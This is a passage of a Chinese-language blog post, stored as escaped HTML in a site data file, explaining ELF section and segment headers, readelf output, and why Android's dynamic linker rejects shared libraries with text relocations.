.note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">02</span>     .data.rel.ro .fini_array .dynamic .got .data .bss</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">03</span>     .dynamic</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">04</span>     .note.android.ident .note.gnu.build-id</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">05</span></span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">06</span>     .ARM.exidx</span></span><br><span class=\"line\"><span class=\"function\">   <span class=\"number\">07</span>     .data.rel.ro .fini_array .dynamic .got</span></span><br></pre></td></tr></table></figure>\n\n\n<p>在 Android 6.0（API Level 23）之后，系统开始严格禁止 .so 文件中的 文本重定位（Text Relocations）</p>\n<ol>\n<li><p>什么是文本重定位（Text Relocations）？</p>\n<p> •    文本重定位指的是修改共享库代码段（通常被标记为只读）的内存地址，以便让其与实际加载的地址一致。<br> •    通常，编译 .so 文件时会生成位置无关代码（Position-Independent Code, PIC），这样生成的代码就能在运行时被加载到任何可用的内存地址，而无需修改代码段的内容。<br> •    但如果 .so 文件不支持位置无关代码，系统在加载时必须对其进行文本重定位，即修改代码段内的指令，以使其与实际的内存地址匹配。</p>\n</li>\n<li><p>为什么 Android 6.0 之后禁止文本重定位？</p>\n<p> •    安全性: 文本重定位需要将代码段设为可写（writable），这违反了现代操作系统的安全原则，即代码段应是只读的，以防止恶意代码注入和利用漏洞进行攻击。文本重定位带来了潜在的安全漏洞，可能被恶意程序利用进行代码注入。<br> •    性能: 文本重定位会增加启动时的开销，因为系统需要在加载 .so 文件时对其进行修改。而且，这会导致共享库无法共享相同的物理内存页面，增加内存占用，降低性能。<br> •    更好的内存管理: 禁止文本重定位有助于 Android 系统实现更高效的内存管理，避免在多进程中加载相同 .so 文件时因为重定位而导致的内存浪费。</p>\n</li>\n<li><p>禁止文本重定位后，.so 文件的加载行为</p>\n<p> •    禁止文本重定位后，系统要求 .so 文件必须是 位置无关代码（PIC），这意味着它可以加载到任何可用的内存地址，而不需要修改代码段的内容。<br> •    只要 .so 文件是用位置无关代码编译的（即 -fPIC 编译选项），它就可以在运行时加载到内存的任何地址，而不需要文本重定位。因此，Android 6.0 之后的 .so 文件并不会被加载到固定地址，而是由系统动态分配可用的内存地址。</p>\n</li>\n</ol>\n<p>文本重定向代码分析<br>这段代码来自于动态链接器的部分，主要用于处理 <strong>动态段</strong> 中的 <code>DT_TEXTREL</code> 标签。<code>DT_TEXTREL</code> 是 ELF 动态段（<code>.dynamic</code> 段）中的一个标识符，它表明该可执行文件或共享库（<code>.so</code> 文件）存在 <strong>文本重定位（text relocations）</strong>。文本重定位指的是在程序加载时，需要修改代码段（<code>.text</code> 段）中的内容来调整符号地址。</p>\n<h3 id=\"代码分析\"><a href=\"#代码分析\" class=\"headerlink\" title=\"代码分析\"></a>代码分析</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    Elf64_Sxword d_tag;     <span class=\"comment\">/* Dynamic entry type */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">        Elf64_Xword d_val;  <span class=\"comment\">/* Integer value */</span></span><br><span class=\"line\">        Elf64_Addr d_ptr;   <span class=\"comment\">/* Program virtual address */</span></span><br><span class=\"line\">    &#125; d_un;</span><br><span class=\"line\">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> DT_TEXTREL:</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> defined(__LP64__)</span></span><br><span class=\"line\">    <span class=\"built_in\">DL_ERR</span>(<span class=\"string\">&quot;\\&quot;%s\\&quot; has text relocations&quot;</span>, <span class=\"built_in\">get_realpath</span>());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">    has_text_relocations = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><p><strong><code>case DT_TEXTREL:</code></strong>:</p>\n<ul>\n<li>这是在动态链接器中解析动态段（<code>.dynamic</code> 段）时的一个 <code>switch</code> 语句分支，处理 <code>DT_TEXTREL</code> 的场景。</li>\n<li><code>DT_TEXTREL</code> 表示该共享库或可执行文件存在需要重定位的 <code>.text</code> 段，即代码段包含绝对地址引用，加载时需要动态修改。</li>\n</ul>\n</li>\n<li><p><strong><code>#if defined(__LP64__)</code></strong>:</p>\n<ul>\n<li>这是一个 <strong>条件编译宏</strong>，用于检查当前系统是否是 <strong>64 位架构</strong>。<code>__LP64__</code> 是 GCC 或 Clang 编译器定义的一个宏，用来标识编译环境为 64 位的长指针模型（LP64 模型），即 <code>long</code> 和 <code>pointer</code> 类型在 64 位系统中为 64 位。</li>\n<li><strong>LP64 架构</strong>: 在 64 位系统上，代码中的指针和 <code>long</code> 类型通常为 64 位。64 位系统通常强制要求 <strong>代码段不可修改</strong>，因为允许修改 <code>.text</code> 段可能带来安全风险。</li>\n</ul>\n</li>\n<li><p><strong><code>DL_ERR(&quot;\\&quot;%s\\&quot; has text relocations&quot;, get_realpath());</code></strong>:</p>\n<ul>\n<li>如果程序运行在 64 位架构上，并且发现 <code>.so</code> 文件中存在 <code>DT_TEXTREL</code>，动态链接器会调用 <code>DL_ERR</code> 函数打印错误信息。这里的 <code>get_realpath()</code> 用于获取当前正在处理的共享库的真实路径，并将其作为错误信息输出。</li>\n<li>错误信息内容：<code>&quot;filename has text relocations&quot;</code>，表示当前文件存在文本重定位。</li>\n</ul>\n</li>\n<li><p><strong><code>return false;</code></strong>:</p>\n<ul>\n<li>对于 64 位系统，一旦发现 <code>.so</code> 文件有文本重定位，动态链接器立即返回 <code>false</code>，表示拒绝加载该文件。这是因为现代 64 位系统通常禁止修改 <code>.text</code> 段以确保安全性，避免代码注入等攻击。</li>\n</ul>\n</li>\n<li><p><strong><code>#else</code> 分支</strong>:</p>\n<ul>\n<li>如果程序运行在 32 位架构上（即没有定义 <code>__LP64__</code>），动态链接器不会立即拒绝加载文件，而是将 <code>has_text_relocations</code> 变量设置为 <code>true</code>。</li>\n<li>在 32 位系统上，尽管 <code>.text</code> 段的重定位被认为是不安全的，但仍然是被允许的，因此不会直接报错，而是继续加载该共享库。</li>\n</ul>\n</li>\n<li><p><strong><code>has_text_relocations = true;</code></strong>:</p>\n<ul>\n<li>在 32 位系统上，动态链接器设置一个标志 <code>has_text_relocations</code> 为 <code>true</code>，记录当前 <code>.so</code> 文件有文本重定位。在后续的加载流程中，动态链接器可能会针对这个标志执行特殊处理，比如发出警告或做额外的安全检查。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"代码逻辑总结\"><a href=\"#代码逻辑总结\" class=\"headerlink\" title=\"代码逻辑总结\"></a>代码逻辑总结</h3><ul>\n<li><p><strong>64 位系统（<code>__LP64__</code>）</strong>:</p>\n<ul>\n<li>如果当前系统是 64 位系统，并且该 <code>.so</code> 文件存在文本重定位 (<code>DT_TEXTREL</code>)，系统会直接报错，并拒绝加载该文件。这是因为现代 64 位系统严格要求代码段不可修改，以提高安全性。</li>\n</ul>\n</li>\n<li><p><strong>32 位系统（非 <code>__LP64__</code>）</strong>:</p>\n<ul>\n<li>如果当前系统是 32 位系统，虽然存在文本重定位，动态链接器仍然允许加载该文件，但会记录 <code>has_text_relocations = true</code>，表明这个文件有文本重定位。32 位系统的安全性要求较低，历史上允许文本重定位以支持不使用位置无关代码（PIC）的库。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"为什么-64-位系统不允许-Text-Relocations？\"><a href=\"#为什么-64-位系统不允许-Text-Relocations？\" class=\"headerlink\" title=\"为什么 64 位系统不允许 Text Relocations？\"></a>为什么 64 位系统不允许 Text Relocations？</h3><ol>\n<li><p><strong>安全性考虑</strong>:</p>\n<ul>\n<li>允许 <code>.text</code> 段可写会带来安全风险，攻击者可以利用这个机制修改代码段，进行代码注入等恶意攻击。</li>\n<li>在 64 位系统上，严禁 <code>.text</code> 段的修改可以有效防止这类攻击。</li>\n</ul>\n</li>\n<li><p><strong>现代系统的内存管理和性能优化</strong>:</p>\n<ul>\n<li>现代 64 位系统采用了更高级的内存管理和优化技术，<code>.text</code> 段通常是共享的内存页。如果允许修改 <code>.text</code> 段，会导致每个进程必须拥有自己独立的内存页，增加内存占用，破坏共享机制。</li>\n<li>禁止文本重定位有助于提高性能和减少内存占用。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"总结-1\"><a href=\"#总结-1\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>这段代码检查动态库是否存在 <code>DT_TEXTREL</code>（文本重定位）标签。在 64 位系统中，检测到文本重定位后，动态链接器会拒绝加载该 <code>.so</code> 文件并抛出错误，而在 32 位系统中，虽然允许文本重定位，但会设置标志 <code>has_text_relocations</code> 为 <code>true</code>，以便后续做相应的处理。这种区别源于 64 位系统对安全性和性能的更高要求。</p>\n<p>#define DT_TEXTREL    22</p>\n<p>00 00 00 03</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>elf解析：<br>链接视图<br>section header table</p>\n<p>运行视图<br>programe header table</p>\n<p>为什么要有运行视图</p>\n<ol>\n<li>相同权限的section 放在一起</li>\n<li>如果用section 来加载到内存中，如果这个节的大小为1025KB,内存分页的大小为1024KB,那么多出的1KB空间，需要另外申请一个页，浪费内存</li>\n</ol>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 32-bit ELF base types. */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf32_Addr;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u16\tElf32_Half;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf32_Off;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s32\tElf32_Sword;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf32_Word;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* 64-bit ELF base types. */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64\tElf64_Addr;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u16\tElf64_Half;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s16\tElf64_SHalf;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64\tElf64_Off;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s32\tElf64_Sword;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u32\tElf64_Word;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __u64\tElf64_Xword;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> __s64\tElf64_Sxword;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>以下为定义的文件头：<br><img src=\"../pic/elf_header.png\" alt=\"alt text\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include/uapi/linux/elf.h</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> EI_NIDENT\t16</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf32_hdr</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span>\te_ident[EI_NIDENT]; <span class=\"comment\">//16字节的魔数等</span></span><br><span class=\"line\">  Elf32_Half\te_type; <span class=\"comment\">//文件类型</span></span><br><span class=\"line\">  Elf32_Half\te_machine; <span class=\"comment\">//需要的体系结构</span></span><br><span class=\"line\">  Elf32_Word\te_version; <span class=\"comment\">//版本</span></span><br><span class=\"line\">  Elf32_Addr\te_entry;  <span class=\"comment\">/* Entry point */</span></span><br><span class=\"line\">  Elf32_Off\te_phoff;</span><br><span class=\"line\">  Elf32_Off\te_shoff;</span><br><span class=\"line\">  Elf32_Word\te_flags;</span><br><span class=\"line\">  Elf32_Half\te_ehsize; <span class=\"comment\">// 表示ELF header 大小 2字节</span></span><br><span class=\"line\">  Elf32_Half\te_phentsize; <span class=\"comment\">// 表示program header table 每个条目的大小</span></span><br><span class=\"line\">  Elf32_Half\te_phnum; <span class=\"comment\">// 表示program header table 包含的条目数</span></span><br><span class=\"line\">  Elf32_Half\te_shentsize; <span class=\"comment\">// 表示section header table 每个条目的大小</span></span><br><span class=\"line\">  Elf32_Half\te_shnum;    <span class=\"comment\">// 表示section header table 包含的条目数</span></span><br><span class=\"line\">  Elf32_Half\te_shstrndx; <span class=\"comment\">//包含section 名称的字符串是第几个</span></span><br><span class=\"line\">&#125; Elf32_Ehdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf64_hdr</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">char</span>\te_ident[EI_NIDENT];\t<span class=\"comment\">/* ELF &quot;magic number&quot; */</span></span><br><span class=\"line\">  Elf64_Half e_type;</span><br><span class=\"line\">  Elf64_Half e_machine;</span><br><span class=\"line\">  Elf64_Word e_version;</span><br><span class=\"line\">  Elf64_Addr e_entry;\t\t<span class=\"comment\">/* Entry point virtual address */</span></span><br><span class=\"line\">  Elf64_Off e_phoff;\t\t<span class=\"comment\">/* Program header table file offset */</span></span><br><span class=\"line\">  Elf64_Off e_shoff;\t\t<span class=\"comment\">/* Section header table file offset */</span></span><br><span class=\"line\">  Elf64_Word e_flags;</span><br><span class=\"line\">  Elf64_Half e_ehsize;</span><br><span class=\"line\">  Elf64_Half e_phentsize;</span><br><span class=\"line\">  Elf64_Half e_phnum;</span><br><span class=\"line\">  Elf64_Half e_shentsize;</span><br><span class=\"line\">  Elf64_Half e_shnum;</span><br><span class=\"line\">  Elf64_Half e_shstrndx;</span><br><span class=\"line\">&#125; Elf64_Ehdr;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>readelf -h file.so</p>\n<figure class=\"highlight r\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ELF Header<span class=\"operator\">:</span></span><br><span class=\"line\">  Magic<span class=\"operator\">:</span>   <span class=\"number\">7</span>f <span class=\"number\">45</span> <span class=\"number\">4</span><span class=\"built_in\">c</span> <span class=\"number\">46</span> <span class=\"number\">01</span> <span class=\"number\">01</span> <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span></span><br><span class=\"line\">  Class<span class=\"operator\">:</span>                             ELF32</span><br><span class=\"line\">  Data<span class=\"operator\">:</span>                              <span class=\"number\">2</span><span class=\"string\">&#x27;s complement, little endian</span></span><br><span class=\"line\"><span class=\"string\">  Version:                           1 (current)</span></span><br><span class=\"line\"><span class=\"string\">  OS/ABI:                            UNIX - System V</span></span><br><span class=\"line\"><span class=\"string\">  ABI Version:                       0</span></span><br><span class=\"line\"><span class=\"string\">  Type:                              DYN (Shared object file)</span></span><br><span class=\"line\"><span class=\"string\">  Machine:                           ARM</span></span><br><span class=\"line\"><span class=\"string\">  Version:                           0x1</span></span><br><span class=\"line\"><span class=\"string\">  Entry point address:               0x0</span></span><br><span class=\"line\"><span class=\"string\">  Start of program headers:          52 (bytes into file)</span></span><br><span class=\"line\"><span class=\"string\">  Start of section headers:          12892 (bytes into file)</span></span><br><span class=\"line\"><span class=\"string\">  Flags:                             0x5000200, Version5 EABI, soft-float ABI</span></span><br><span class=\"line\"><span class=\"string\">  Size of this header:               52 (bytes)</span></span><br><span class=\"line\"><span class=\"string\">  Size of program headers:           32 (bytes)</span></span><br><span class=\"line\"><span class=\"string\">  Number of program headers:         8</span></span><br><span class=\"line\"><span class=\"string\">  Size of section headers:           40 (bytes)</span></span><br><span class=\"line\"><span class=\"string\">  Number of section headers:         27</span></span><br><span class=\"line\"><span class=\"string\">  Section header string table index: 26</span></span><br></pre></td></tr></table></figure>\n\n<p>链接视图：<br>SHT(section header table)<br>SHT是程序编译链接之后按照功能逻辑组织代码数据的方式，sht位于elf文件的最后<br>源码编译后生成的不同性质的数据会分门别列的放置，因此出现代码段，数据段，符号段<br><img src=\"../pic/code_sht.JPG\" alt=\"alt text\"></p>\n<p><img src=\"../pic/sht.png\" alt=\"alt text\"></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* sh_type */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NULL\t0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_PROGBITS\t1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_SYMTAB\t2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_STRTAB\t3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_RELA\t4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_HASH\t5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_DYNAMIC\t6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NOTE\t7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NOBITS\t8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_REL\t\t9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_SHLIB\t10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_DYNSYM\t11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_NUM\t\t12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_LOPROC\t0x70000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_HIPROC\t0x7fffffff</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_LOUSER\t0x80000000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHT_HIUSER\t0xffffffff</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* sh_flags */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_WRITE\t\t0x1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_ALLOC\t\t0x2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_EXECINSTR\t\t0x4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_RELA_LIVEPATCH\t0x00100000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_RO_AFTER_INIT\t0x00200000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHF_MASKPROC\t\t0xf0000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* special section indexes */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_UNDEF\t0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_LORESERVE\t0xff00</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_LOPROC\t0xff00</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_HIPROC\t0xff1f</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_LIVEPATCH\t0xff20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_ABS\t\t0xfff1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_COMMON\t0xfff2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> SHN_HIRESERVE\t0xffff</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf32_shdr</span> &#123;</span><br><span class=\"line\">  Elf32_Word\tsh_name; <span class=\"comment\">//节名</span></span><br><span class=\"line\">  Elf32_Word\tsh_type; <span class=\"comment\">//节类型</span></span><br><span class=\"line\">  Elf32_Word\tsh_flags; <span class=\"comment\">//节标志位</span></span><br><span class=\"line\">  Elf32_Addr\tsh_addr;  <span class=\"comment\">//虚拟地址</span></span><br><span class=\"line\">  Elf32_Off\tsh_offset; <span class=\"comment\">//文件偏移地址</span></span><br><span class=\"line\">  Elf32_Word\tsh_size; <span class=\"comment\">//节大小</span></span><br><span class=\"line\">  Elf32_Word\tsh_link; </span><br><span class=\"line\">  Elf32_Word\tsh_info;</span><br><span class=\"line\">  Elf32_Word\tsh_addralign; <span class=\"comment\">//对齐偏移</span></span><br><span class=\"line\">  Elf32_Word\tsh_entsize; </span><br><span class=\"line\">&#125; Elf32_Shdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> <span class=\"title class_\">elf64_shdr</span> &#123;</span><br><span class=\"line\">  Elf64_Word sh_name;\t\t<span class=\"comment\">/* Section name, index in string tbl */</span></span><br><span class=\"line\">  Elf64_Word sh_type;\t\t<span class=\"comment\">/* Type of section */</span></span><br><span class=\"line\">  Elf64_Xword sh_flags;\t\t<span class=\"comment\">/* Miscellaneous section attributes */</span></span><br><span class=\"line\">  Elf64_Addr sh_addr;\t\t<span class=\"comment\">/* Section virtual addr at execution */</span></span><br><span class=\"line\">  Elf64_Off sh_offset;\t\t<span class=\"comment\">/* Section file offset */</span></span><br><span class=\"line\">  Elf64_Xword sh_size;\t\t<span class=\"comment\">/* Size of section in bytes */</span></span><br><span class=\"line\">  Elf64_Word sh_link;\t\t<span class=\"comment\">/* Index of another section */</span></span><br><span class=\"line\">  Elf64_Word sh_info;\t\t<span class=\"comment\">/* Additional section information */</span></span><br><span class=\"line\">  Elf64_Xword sh_addralign;\t<span class=\"comment\">/* Section alignment */</span></span><br><span class=\"line\">  Elf64_Xword sh_entsize;\t<span class=\"comment\">/* Entry size if section holds table */</span></span><br><span class=\"line\">&#125; Elf64_Shdr;</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>在 ELF 文件中，<code>shdr</code> 是 <code>Section Header</code> 的缩写，表示段头表（Section Header Table）中的一项。段头表描述了 ELF 文件中各个段的基本信息，帮助系统在加载或链接时正确处理各个段。</p>\n<p>让我们逐一解释 <code>Elf64_Shdr</code> 结构体中的各个字段：</p>\n<ol>\n<li><p>**<code>sh_name</code> (Section name, index in string table)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：这是一个指向字符串表的索引，字符串表保存了段的名称。通过该索引，可以找到对应的段名称。<br>在段头表中的 sh_name 字段记录了一个索引值。<br>该索引值对应于 .shstrtab 段中的偏移量。<br>在 .shstrtab 段中，从该偏移量开始的字符串就是该段的名称。</li>\n</ul>\n</li>\n<li><p>**<code>sh_type</code> (Type of section)**：</p>\n<ul>\n<li>类型：<code>Elf64_Word</code>（32位无符号整数）</li>\n<li>解释：该字段表示段的类型，常见的类型有：<ul>\n<li><code>SHT_NULL</code>：空段</li>\n<li><code>SHT_PROGBITS</code>：程序数据段</li>\n<li><code>SHT_SYMTAB</code>：符号表段</li>\n<li><code>SHT_STRTAB</code>：字符串表段</li>\n<li><code>SHT_RELA</code>：带重定位的符号段等</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>**<code>sh_flags</code> (Miscellaneous section attributes)**：</p>\n<ul>\n<li>类型：<code>Elf64_Xword</code>（64位无符号整数）</li>\n<li>解释：段的属性标志，可能的标志有：<ul>\n<li><code>SHF_WRITE</code>：段包含可写数据</li>\n<li><code>SHF_ALLOC</code>：段需要被加载到内存中</li>\n<li><code>SHF_EXECINSTR</code>：段包含可执行指令</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>**<code>sh_addr</code> (Section virtual addr at execution)**：</p>\n<ul>\n<li>类型：<code>Elf64_Addr</code>（64位无符号整数）</li>\n<li>解释：段在内存中的虚拟地址。如果段需要被加载到内存中（如代码段或数据段），该地址表示它在进程地址空间中的位置。对于非加载段，这个值为 0。</li>\n</ul>\n</li>\n<li><p>**<code>sh_offset</code> (Section file 